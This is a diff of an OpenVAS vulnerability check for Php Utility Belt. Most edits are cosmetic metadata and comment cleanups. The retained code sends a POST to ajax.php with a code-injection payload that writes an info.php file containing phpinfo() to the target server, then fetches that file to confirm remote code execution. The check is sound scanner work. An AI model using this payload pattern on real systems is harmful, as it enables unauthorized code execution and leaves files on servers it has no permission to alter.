@@ -1,8 +1,8 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_php_utility_belt_mult_vuln.nasl 6709 2017-07-12 15:16:14Z cfischer $
+# $Id: gb_php_utility_belt_mult_vuln.nasl 11523 2018-09-21 13:37:35Z asteins $
 #
-# Php Utility Belt Multiple Vulnerabilities 
+# Php Utility Belt Multiple Vulnerabilities
 #
 # Kashinath T <tkashinath@secpod.com>
 #
@@ -28,10 +28,10 @@ CPE = "cpe:/a:php_utility_belt:php";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.807614");
-  script_version("$Revision: 6709 $");
+  script_version("$Revision: 11523 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 17:16:14 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-21 15:37:35 +0200 (Fri, 21 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-03-16 10:38:20 +0530 (Wed, 16 Mar 2016)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Php Utility Belt Multiple Vulnerabilities");
@@ -47,13 +47,13 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow an
   unauthenticated remote attacker to conduct remote code execution, also
-  allows them to gain system information.
-
-  Impact Level: Application");
+  allows them to gain system information.");
 
   script_tag(name:"affected", value:"Php Utility Belt");
 
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year since disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
@@ -74,16 +74,11 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-dir = "";
-url = "";
-
 if(!php_port = get_app_port(cpe:CPE)) exit(0);
 if(!dir = get_app_location(cpe:CPE, port:php_port)) exit(0);
 
 host = http_host_name(port:php_port);
 
-##Construct POSTDATA
 postData = "code=fwrite(fopen('info.php'%2C'w')%2C'%3C%3Fphp+echo+phpinfo()%3B%3F%3E')%3B";
 
 req =   'POST '+dir+'/ajax.php HTTP/1.1\r\n' +
@@ -93,14 +88,12 @@ req =   'POST '+dir+'/ajax.php HTTP/1.1\r\n' +
 	'\r\n'+
         postData;
 
-##Send and Receive Response
 res = http_keepalive_send_recv(port:php_port, data:req);
 
 if(res && 'HTTP/1.1 200 OK' >< res)
 {
    url = dir+ '/info.php';
 
-   ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:php_port, url:url,  pattern:">phpinfo\(\)<",
                       extra_check:make_list(">System", ">Configuration File")))
    {
